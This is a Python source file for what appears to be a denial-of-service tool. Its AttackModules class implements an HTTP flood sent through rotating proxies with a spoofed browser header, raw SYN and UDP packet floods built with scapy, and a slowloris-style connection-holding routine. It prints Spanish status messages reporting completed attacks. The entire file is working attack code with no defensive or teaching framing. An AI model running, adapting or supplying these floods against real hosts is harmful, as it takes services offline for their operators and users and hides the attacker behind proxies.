import asyncio
import aiohttp
import random
import time
import threading
from typing import List, Optional, Dict, Tuple
from scapy.all import IP, TCP, UDP, Raw, send
from models import Proxy
from proxy_manager import ProxyManager

class AttackModules:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
    
    async def http_flood(self, target: str, duration: int, intensity: int):
        start_time = time.time()
        request_count = 0
        success_count = 0
        
        while time.time() - start_time < duration:
            tasks = []
            for _ in range(min(intensity, 100)):
                proxy = self.proxy_manager.get_proxy()
                if not proxy:
                    await asyncio.sleep(0.1)
                    continue
                
                task = self._make_http_request(target, proxy)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, bool) and result:
                    success_count += 1
                    request_count += 1
                elif isinstance(result, Exception):
                    request_count += 1
            
            elapsed = time.time() - start_time
            if elapsed > 0:
                current_rate = request_count / elapsed
                if current_rate < intensity:
                    await asyncio.sleep(0.1)
        
        print(f"Ataque HTTP flood completado. Requests: {request_count}, Success: {success_count}, Rate: {request_count/duration:.2f} req/s")
        return request_count, success_count
    
    async def _make_http_request(self, target: str, proxy: Proxy) -> bool:
        try:
            proxy_url = f"http://{proxy.ip}:{proxy.port}"  
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target,
                    proxy=proxy_url,
                    headers=self.headers,
                    timeout=10,
                    ssl=False
                ) as response:
                    if response.status == 200:
                        return True
                    else:
                        self.proxy_manager.mark_failed(proxy)
        except:
            self.proxy_manager.mark_failed(proxy)
        return False
    
    def syn_flood(self, target_ip: str, target_port: int, duration: int):
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            ip_packet = IP(dst=target_ip)
            tcp_packet = TCP(dport=target_port, flags="S", seq=random.randint(1000, 65535))
            send(ip_packet/tcp_packet, verbose=0)
            packet_count += 1
        
        print(f"Ataque SYN flood completado. Paquetes: {packet_count}")
        return packet_count
    
    def udp_flood(self, target_ip: str, target_port: int, duration: int):
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            ip_packet = IP(dst=target_ip)
            udp_packet = UDP(dport=target_port)
            raw_packet = Raw(b"X" * 1024)
            send(ip_packet/udp_packet/raw_packet, verbose=0)
            packet_count += 1
        
        print(f"Ataque UDP flood completado. Paquetes: {packet_count}")
        return packet_count
    
    async def slowloris(self, target: str, duration: int):
        start_time = time.time()
        connection_count = 0
        
        while time.time() - start_time < duration:
            proxy = self.proxy_manager.get_proxy()
            if not proxy:
                await asyncio.sleep(0.1)
                continue
            
            try:
                proxy_url = f"http://{proxy.ip}:{proxy.port}"  
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        target,
                        proxy=proxy_url,
                        headers=self.headers,
                        timeout=30,
                        ssl=False
                    ) as response:
                        connection_count += 1
                        await asyncio.sleep(10)
            except:
                self.proxy_manager.mark_failed(proxy)
        
        print(f"Ataque Slowloris completado. Conexiones: {connection_count}")
        return connection_count